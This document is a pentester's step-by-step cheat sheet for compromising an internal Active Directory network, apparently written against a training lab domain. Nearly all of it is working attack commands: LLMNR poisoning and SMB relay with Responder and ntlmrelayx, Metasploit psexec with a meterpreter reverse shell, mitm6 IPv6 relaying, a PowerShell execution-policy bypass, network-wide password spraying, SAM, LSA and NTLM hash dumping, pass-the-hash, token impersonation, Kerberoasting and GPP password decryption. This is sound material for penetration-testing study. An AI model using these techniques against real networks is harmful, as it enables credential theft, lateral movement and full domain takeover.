Pen testing an internal AD network

-----------------------------------------------------------------------------------------------------------------------------

1. LLMNR Poisoning

link-local multicast name resolution (LLMNR) 
This is basically used when DNS fails and is similar to NETBIOS. NOTE: The key flaw is that when responding, the services uses a user´s username and NTLMv2 hash.

To run this, make sure you have Impacter installed on Kali. https://github.com/SecureAuthCorp/impacket
Note, that part of responder includes tools like psexec.py. psexec.py sometimes gets caught by Windows Defender or other Antivirus tools. It is then worth trying other tools in the toolkit. Have a look here for additional tools in impactor. https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d

In kali:
syntax: responder -I interface -rdwv (v for verbose to ensure that the hash is shown twice)

once responder picks up a username and hash, we can make use of hashcat or other hash cracking tools to try to crack the hash. 
Make sure to put the username and hash in a file. check hashcat --help to find the module for the type of hash you need to crack. NTLM is the standard Windows hash and the module for that is 5600. 
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt
If you need another password list, google "password seclist".

--------------------------------------------------------------------------------------------------------------------------------------------------

2. SMB Relay

Here, rather than cracking the password hash from the LLMNR poisoning done above, we are going to relay that hash to another machine on the network and attempt to gain access. Note, we can not relay back to the same machine. SMB signing must be disabled and the user has to be admin on the other machine. 

To start with, we need to run a check to see which systems on the network have SMB signing disabled. We can use Nessus, nmap or even a github script to do that.

nmap: 
syntax: nmap --script=smb2-security-mode.nse -p445 10.0.1.0/24 
The server will have signing enabled and required, but any desktop machines will generally have it enabled, but not required and that means we can take advantage of that. 
From that scan, create a list on kali with the IP´s of the machines that have it enabled, but not required. 
Now, we need to edit the Responder conf file and disable SMB and HTTP.
syntax: nano /etc/responder/Responder.conf
Run Responder:
syntax: responder -I eth0 -rdwv (check at the top that HTTP and SMB are off)
In another tab, we need to set up the relay: 
syntax: ntlmrelayx.py -tf targets.txt -smb2support
check the response on the relay and you should get a dump of the SAM hashes, which is the Windows equivalent of the /etc/shadow file on Linux. Note, these are local users, not the Domain users. 
save the hashes for later cracking. 

We can also try to get an interactive shell on the machine, by adding a -i to the end of the relay command. 

So, run responder:
responder -I eth0 -rdwv (note, HTTP and SMB should still be disabled)
then run the relay:
ntlmrelayx.py -tf targets.txt -smb2support -i
now, on another tab, run:
nc 127.0.0.1 portnr (it will show the open port number in the relay output).
type: help
we are on the share now, but we can type: 
shares
this will show all the shares
we can type:
use C$
this will take us to the C drive (if it is listed in the shares)
use ADMIN$ 
will give us access to the Systems folder. 
Note, there are additional methods we can use rather than just the interactive shell in the relay command. We could create a meterpreter shell or get the relay to run a command (think Powershell).

---------------------------------------------------------------------------------------------------------------------------------------------------------

3. Gaining Shell Access

If we have local users, then we can use msfconsole to gain a shell. Note, this is based on the username and password we cracked earlier in LLMNR. 

syntax: msfconsole
search psexec
look for smb/psexec, which seems to be nr 10 in msfconsole
use 10
options
set RHOSTS IP
set SMBDomain DOMAIN
set SMBPass CrackedPassword
set SMBUser user
set payload windows/x64/meterpreter/reverse_tcp
set LHOST eth0
run
Note, this might not work on the first run. Try again. If it still does not work, try running options again. 
Set a new TARGET
set TARGET 2
run

If it still does not work, we can try a different tool. 

psexec.py
Syntax: psexec.py marvel.local/fcastle:Password1@10.0.1.6

We can also try:

syntax: wmiexec.py marvel.local/fcastle:Password1@10.0.1.6

or

syntax: smbexec.py marvel.local/fcastle:Password1@10.0.1.6

-------------------------------------------------------------------------------------------------------------------------------------------------------

4. IPv6 Attacks

Most networks are still running on IPv4, but IPv6 is enabled and all machines also get an IPv6 IP. However, who is doing the DNS for IPv6? The answer is no one and this provides us with the opportunity to do a Man in the Middle attack against IPv6. 

install MTIM6 from here: https://github.com/fox-it/mitm6

once ready, run:
syntax: mitm6 -d marvel.local
then we need a relay:
sudo ntlmrelayx.py -6 -t ldaps://10.0.1.4 -wh fakewpad.marvel.local -l lootme (most Domain Controls have the certificate installed, so LDAP Secure is good, we are doimg this on IPv6, hence the 6). 

if you go to the lootme folder on Kali, once a computer has been rebooted or some time has passed, then you should see all sorts of interesting information. 

--------------------------------------------------------------------------------------------------------------------------------------------------------

5. Post Exploitation Enumeration

Powerview

Go to https://github.com/PowerShellMafia/PowerSploit and download/clone the repo to a Windows machine on the network.

go to cmd on the Windows machine and cd to the Recon folder of the repo you just downloaded. 

We need to bypass the execution policy on, so we run:

syntax: powershell -ep bypass (ep stands for execution policy)

Now, there are a huge amount of commands one can run with PowerView. Check out: 
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 for more examples. 

Let´s get info about the domain. In cmd, run:
syntax: Get-NetDomain

If we want specifics on the Domain Controller or Controllers, we can run:
syntax: get-NetDomainController

This provides the IP of the Domain Controller, the OS the DC is running etc. 

We can get the DomainPolicy. 

syntax: get-DomainPolicy

We can see the Kerberos Policy from this (for example). 

We can also find the password policy. 

syntax: (Get-DomainPolicy)."systemaccess"

This can give us a great amount of details, like the minimum password lenght. If we know the minimum is 7 for example, then we could spray the systems with passwords that are 7 characters. 

We can get a list of all the users and any descriptions by running:

syntax: get-NetUser

We can look through this for usernames and any useful info in descriptions (sometimes people leave system service passwords in descriptions, even though these should not typically be there.)

The problem with the above command is that we can end up with a huge list on a corporate network. So, we can run:

syntax: get-NetUser | select cn

This will just list the users. To get the usernames, we could run:

syntax: get-NetUser | select samaccountname

We could also just get the descriptions by running:

syntax: get-NetUser | select description

There are a huge amount of commands and details we can get from Powerview. It is worth digging around using the gists for example queries.

BloodHound

BloodHound will give us amazing graphical views of the entire network. To use it, we need to install BloodHound on Kali.

syntax: apt install bloodhound
syntax: neo4j console
Browse to the localhost:port that neo4j opens
the username and password by default are neo4j. 
Change the password to something else.
Then, in terminal run:
syntax: bloodhound
Bloodhound should open. Now, we need to get an ingestor, as there is no data in there. 
So, we need to download https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 onto one of the Windows client machines on the network. Once that is done, run cmd.
syntax: powershell -ep bypass 
syntax: . .\SharpHound.ps1
syntax: Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN> ZipFileName file.zip
Once this has finished, we need to copy it across to our Kali machine and import it into BloodHound. One could use the SMB share or install WinCP on the Windows machine to achieve this. 
Once copied across, go to BloodHound and click on the upload data icon on the right hand side. Then, select the file and let is import. Once done, go to the left hand side and check the data. Then, look through the Analysis tab for all the built-in queries. 

--------------------------------------------------------------------------------------------------------------------------------------------------------

6. Post Compromise Attacks

Pass the Password

First, we need to set up crackmapexec. 
syntax: apt install crackmapexec

Next, we want to sweep the entire network with the username and password that we have already captured to see if we can get access anywhere else.
syntax: crackmapexec smb 10.0.1.0/24 -u <USERNAME> -d <DOMAIN> -p <PASSWORD>

We hopefully get a list of new machines that we didn´t know about and hopefully access to those machines.

We can also try to dump the SAM databases on the machines, if crackmapexec gets access using the credentials. 

syntax: crackmapexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1 --sam

We can also dump LSA secrets (where possible)

syntax: crackmapexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1 --lsa

There are a number of options with crackmapexec. 

Dumping Hashes

We are going to use secretsdump.py, which is also built into impactor. 

syntax: secretsdump.py DOMAIN/USERNAME:PASSWORD@IP

If Windows Defender does not block this, then it should dump the hashes of all the local users on the machine (note, not the Domain users). We can try different machines using the same login, to see if that user has access on those machines as well and then we can download additional hashes. 

Once we have the hashes, copy them to a text file to crack and/or we can also pass the hash. 

To crack the hashes of the local users, we are going to use hashcat again. Note, local user hashes on Windows are stored as NTLM and not NTLMv2. Also, Remember that one can pass around NTLM hashes, but NOT NTLMv2 hashes. 

syntax: hashcat.exe -m 1000 /home/hacker/test.txt /usr/share/wordlists/rockyou.txt -O (on Windows, -m 1000 for NTLM)

Pass the Hash

Now, to pass the hash, we are going to use crackmapexec. 

syntax: crackmapexec smb IPRANGE -u "User Name"/userlogin -H <HASH> --local-auth

This allows us to rather use a hash and not have to crack a password to take advantage of users.

Token Impersonation with Incognito

Every time a user logs into a machine, a token is created and this token remains in place until the machine is rebooted. So, let´s do that.

syntax: msfconsole
syntax: search psexec
syntax: options
syntax: set RHOSTS IP
syntax: set SMBDomain DOMAIN
syntax: set SMBUser USERNAME
syntax: set SMBPass PASSWORD
syntax: show targets
syntax: set TARGET ID
syntax: options
syntax: set LHOST INTERFACE/IP
syntax: exploit

if we get a meterpreter shell, run the following:

syntax: load incognito
syntax: list_tokens -u
syntax: impersonate_token DOMAIN\\username

This allows you to impersonate any user that has logged into the system since the last reboot. It means you can move laterally through a system and try to escalate privileges.

Kerberoasting

With Kerberoasting, we are going to make use of the fact that we have a valid username and password and request a service ticket from the Domain Controller, which runs Kerberos. The request will then provide a response with a service hash, which we can then crack. 

We need to use a tool in Impactor. 

syntax: GetUserSPNs.py DOMAIN/username:password -dc-ip DCIP -request

The response will give us a hash, which we can add to our hashes that we already have and then we can crack it using hashcat. 

In hashcat, the module we need is for Kerberos TGS, which we can do a grep for.

We can then use the cracked password to do either lateral or vertical movement, especially if the service account is set up incorrectly as an Admin on the DC. 

GPP/cPassword

It is really important to check for this vulnerability, even if one would assume that the machines have the patch installed. We are interested in finding the Groups.xml file, which is found in SysVol. 

Once you have the cPassword within the Groups.xml file, you can run gpp-decrypt on the kali machine to break it. 

syntax: gpp-decrypt cPassword

With this, one can try to escalate privileges or even, if it is a service user, use Kerberoasting to get another hash and see if you can get Admin access on the DC. 



